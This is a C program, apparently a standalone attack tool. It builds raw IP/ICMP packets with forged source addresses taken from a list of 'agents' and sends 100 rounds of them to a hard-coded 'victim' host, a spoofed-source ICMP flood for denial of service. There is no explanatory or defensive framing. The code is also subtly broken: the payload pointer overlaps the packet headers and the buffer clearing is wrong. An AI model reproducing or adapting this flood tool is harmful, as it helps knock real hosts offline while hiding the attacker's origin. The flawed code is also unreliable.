#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <netdb.h>
#include <ctype.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <errno.h>
#include <time.h>
#include <signal.h>

unsigned short checksum(void *b, int len) {
    unsigned short *buf = b;
    unsigned int sum = 0;
    unsigned short result;

    for (sum = 0; len > 1; len -= 2)
        sum += *buf++;

    if (len == 1)
        sum += *(unsigned char*)buf;

    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;

    return result;
}

int main() {
    int sockfd;
    char *agents[] = {"10.0.0.1","10.0.0.2","10.0.0.3"}; 
    char victim[] = "10.0.0.4";  	
    int rounds = 100;			
    char *packet;    
    char *payload;
    int psize = 1024;
	
    int num_agents = sizeof(agents)/sizeof(agents[0]);
    printf("Agents total: %d\n",num_agents);
    
    struct sockaddr_in dest_addr;

    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if (sockfd < 0) {
        perror("Socket creation failed");
        exit(1);
    }
    
    
    int random = 1;
    if (setsockopt(sockfd, IPPROTO_IP, IP_HDRINCL, &random, sizeof(random)) < 0) {
        perror("setsockopt error");
        return 1;
    }
    if (setsockopt (sockfd, SOL_SOCKET, SO_BROADCAST, (const char*)&random, sizeof (random)) == -1) 
    {
        perror("setsockopt broadcast error");
        return (0);
    }  
    struct timeval timeout = {5, 0};
    if( setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&timeout, sizeof timeout) == -1)
    {
	perror("setsockopt receive error");
	return (0);
    }
    dest_addr.sin_family = AF_INET;
    dest_addr.sin_addr.s_addr = inet_addr(&victim[0]); 

    for(int r = 0; r < rounds; r++){
    	for(int i = 0; i< num_agents ; i++){
	    packet = malloc(sizeof(struct iphdr) + sizeof(struct icmphdr) + psize);
	    payload = packet + sizeof(struct icmphdr);
	    strcpy(payload,"Tu kaun hai tera naam kya");
	    struct iphdr *iph = (struct iphdr *) packet;
	    struct icmphdr *icmph = (struct icmphdr *) (packet + sizeof(struct iphdr));
	    memset(packet, 0, sizeof(packet));
	
	    iph->ihl = 5;
	    iph->version = 4;
	    iph->tos = 0;
	    iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + psize;
	    iph->id = htons(rand() % 65535);
	    iph->frag_off = 0;
	    iph->ttl = 255;
	    iph->protocol = IPPROTO_ICMP;
	    iph->saddr = inet_addr(agents[i]); 
	    iph->daddr = dest_addr.sin_addr.s_addr;
	
	    icmph->type = 13;
	    icmph->code = 0;
	    icmph->un.echo.sequence = htons(i*100+r); 
    	    icmph->un.echo.id = rand(); 
	    icmph->checksum = 0;
	    icmph->checksum = checksum((unsigned short *) icmph, sizeof(struct icmphdr)+psize);
	  
	    if (sendto(sockfd, packet, sizeof(struct iphdr) + sizeof(struct icmphdr) + psize, 0,
		       (struct sockaddr *) &dest_addr, sizeof(dest_addr)) < 0) {
		perror("Send failed");
		exit(1);
	    }
	    free(packet);
	    printf("%d ICMP packet sent from %s (round %d)\n", i+1, agents[i], r+1);
    	}
    }

    close(sockfd);
    return 0;
}